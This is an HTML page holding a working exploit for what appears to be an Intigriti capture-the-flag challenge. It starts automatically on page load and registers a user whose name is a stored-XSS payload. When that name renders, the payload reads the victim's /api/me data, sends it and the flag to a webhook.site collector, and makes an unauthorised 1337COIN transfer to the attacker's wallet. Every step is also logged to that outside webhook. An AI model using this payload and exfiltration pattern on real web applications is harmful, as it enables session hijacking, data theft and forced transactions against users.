<!DOCTYPE html>
<html>
<head>
    <title>Working Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0f0; }
        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 12px; max-height: 400px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #0ff; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>ðŸŽ¯ Intigriti Challenge 0126 - Exploit</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/cd3dd66f-9d04-45e9-8b91-ff909c9d39f2';

        let step = 0;

        function log(msg, type = 'info') {
            step++;
            const timestamp = new Date().toLocaleTimeString();
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += `<div class="${type}">[${step}] ${timestamp} - ${msg}</div>`;
            console.log(`[${step}] ${msg}`);

            // Send to webhook
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    step: step,
                    message: msg,
                    type: type
                })
            }).catch(() => {});
        }

        async function exploit() {
            log('ðŸš€ EXPLOIT STARTED - HTML Entity XSS Bypass', 'info');

            try {
                // HTML entity XSS payload - bypasses validation, executes when rendered via innerHTML
                const RANDOM_SUFFIX = Math.random().toString(36).substring(2, 10);
                const XSS_USERNAME = `xss_${RANDOM_SUFFIX}&lt;img src=x onerror=&quot;
                    (async () => {
                        try {
                            const meResp = await fetch('/api/me', {credentials: 'include'});
                            const meData = await meResp.json();

                            await fetch('${WEBHOOK}', {
                                method: 'POST',
                                mode: 'no-cors',
                                body: JSON.stringify({
                                    timestamp: new Date().toISOString(),
                                    flag: meData.flag,
                                    source: 'marketwatch_xss',
                                    user: meData
                                })
                            });

                            await fetch('/api/transaction', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                credentials: 'include',
                                body: JSON.stringify({
                                    toAddress: '${OUR_WALLET}',
                                    currency: '1337COIN',
                                    amount: 1
                                })
                            });

                            alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));
                        } catch(e) {
                            console.error('XSS error:', e);
                        }
                    })();
                &quot;&gt;`;

                log('XSS Username (truncated): ' + XSS_USERNAME.substring(0, 70) + '...', 'info');

                // STEP 1: Register with XSS username
                log('Step 1: Registering with XSS username...', 'info');
                log('Username (truncated): ' + XSS_USERNAME.substring(0, 60) + '...', 'warning');

                const regResp = await fetch(TARGET + '/api/register', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: XSS_USERNAME,
                        password: 'XSSPass123!'
                    })
                });

                const regData = await regResp.json();

                if (regResp.ok) {
                    log('âœ… Registration successful!', 'success');
                } else if (regData.error?.toLowerCase().includes('exists') || regResp.status === 400) {
                    log('âš  User may already exist, trying login...', 'warning');
                } else {
                    log('âŒ Registration failed: ' + JSON.stringify(regData), 'error');
                    log('Trying login anyway...', 'warning');
                }

                // STEP 2: Login as XSS user
                log('Step 2: Logging in as XSS user...', 'info');

                const loginResp = await fetch(TARGET + '/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        username: XSS_USERNAME,
                        password: 'XSSPass123!'
                    })
                });

                const loginData = await loginResp.json();
                if (loginResp.ok) {
                    log('âœ… Login successful!', 'success');
                } else {
                    log('âŒ Login failed: ' + (loginData.error || 'Unknown'), 'error');
                }

                // STEP 3: Make transaction (will have our XSS username as nickname)
                log('Step 3: Making transaction...', 'info');

                const txResp = await fetch(TARGET + '/api/transaction', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    })
                });

                const txData = await txResp.json();
                if (txResp.ok) {
                    log('âœ… Transaction successful!', 'success');
                } else {
                    log('âš  Transaction failed: ' + (txData.error || 'Unknown') + ' - Continuing anyway...', 'warning');
                }

                // STEP 4: Trigger alert (requirement)
                log('Step 4: Triggering alert("gigawatz")...', 'info');
                alert('gigawatz');
                log('âœ… Alert triggered', 'success');

                // STEP 5: Wait and redirect to marketwatch
                log('Step 5: Waiting 5 seconds...', 'info');
                await new Promise(r => setTimeout(r, 5000));

                log('Step 6: Redirecting to marketwatch.html...', 'warning');
                log('XSS should execute when page loads and renders our username!', 'warning');

                setTimeout(() => {
                    window.location.href = TARGET + '/marketwatch.html';
                }, 2000);

            } catch (error) {
                log('âŒ ERROR: ' + error.message, 'error');
                console.error(error);
            }
        }

        async function checkFlag() {
            log('Checking /api/me for flag...', 'info');

            try {
                const response = await fetch(TARGET + '/api/me', {
                    credentials: 'include'
                });

                const data = await response.json();

                log('API Response: hasFlag=' + !!data.flag, 'info');

                if (data.flag) {
                    log('ðŸ† FLAG FOUND: ' + data.flag, 'success');
                    alert('ðŸ† FLAG: ' + data.flag);

                    // Send flag to webhook
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        mode: 'no-cors',
                        body: JSON.stringify({
                            timestamp: new Date().toISOString(),
                            flag: data.flag,
                            challenge: 'intigriti-0126'
                        })
                    }).catch(() => {});

                    return true;
                }

                return false;

            } catch (error) {
                log('Flag check error: ' + error.message, 'error');
                return false;
            }
        }

        // Auto-start when page loads
        window.addEventListener('load', () => {
            log('Page loaded - starting exploit in 1 second...', 'info');
            setTimeout(exploit, 1000);
        });
    </script>
</body>
</html>
